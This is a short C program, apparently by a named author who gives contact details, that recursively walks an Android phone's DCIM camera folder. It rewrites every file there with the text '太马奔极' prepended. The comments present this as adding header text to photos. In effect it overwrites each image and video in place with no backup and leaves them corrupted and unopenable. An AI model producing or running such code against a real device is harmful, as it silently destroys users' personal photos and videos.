#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
//作者:太马奔极
//QQ:2251149780
//邮箱:2251149780@qq.com

void insertTextAtBeginning(const char *filePath, const char *textToInsert);
void processDirectory(const char *directoryPath, const char *textToInsert);

int main() {
    // 照片的路径和要插入的头文字
    const char *directoryPath = "/storage/emulated/0/DCIM";
    const char *textToInsert = "太马奔极";

    // 调用函数处理目录
    processDirectory(directoryPath, textToInsert);

    return 0;
}

// 在文件开头插入指定文本的函数
void insertTextAtBeginning(const char *filePath, const char *textToInsert) {
    FILE *file = fopen(filePath, "rb");
    if (file == NULL) {
        perror("无法打开文件");
        exit(EXIT_FAILURE);
    }

    // 获取文件大小
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // 分配内存以读取整个文件内容
    char *buffer = (char *)malloc(fileSize + 1);
    if (buffer == NULL) {
        perror("内存分配失败");
        fclose(file);
        exit(EXIT_FAILURE);
    }

    // 读取文件内容到缓冲区
    fread(buffer, 1, fileSize, file);
    fclose(file);

    // 重新打开文件以写入模式
    file = fopen(filePath, "wb");
    if (file == NULL) {
        perror("无法打开文件");
        free(buffer);
        exit(EXIT_FAILURE);
    }

    // 写入要插入的文本
    fwrite(textToInsert, 1, strlen(textToInsert), file);
    // 写入原始文件内容
    fwrite(buffer, 1, fileSize, file);

    // 清理资源
    fclose(file);
    free(buffer);
}

// 处理目录的函数
void processDirectory(const char *directoryPath, const char *textToInsert) {
    DIR *dir;
    struct dirent *entry;
    struct stat pathStat;

    if ((dir = opendir(directoryPath)) == NULL) {
        perror("无法打开目录");
        exit(EXIT_FAILURE);
    }

    while ((entry = readdir(dir)) != NULL) {
        // 跳过"."和".."目录项
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        // 构建完整路径
        char fullPath[1024];
        snprintf(fullPath, sizeof(fullPath), "%s/%s", directoryPath, entry->d_name);

        // 获取文件信息
        if (stat(fullPath, &pathStat) == -1) {
            perror("无法获取文件信息");
            continue;
        }

        // 如果是普通文件，则进行处理
        if (S_ISREG(pathStat.st_mode)) {
            insertTextAtBeginning(fullPath, textToInsert);
        } else if (S_ISDIR(pathStat.st_mode)) {
            // 如果是目录，则递归处理子目录
            processDirectory(fullPath, textToInsert);
        }
    }

    closedir(dir);
}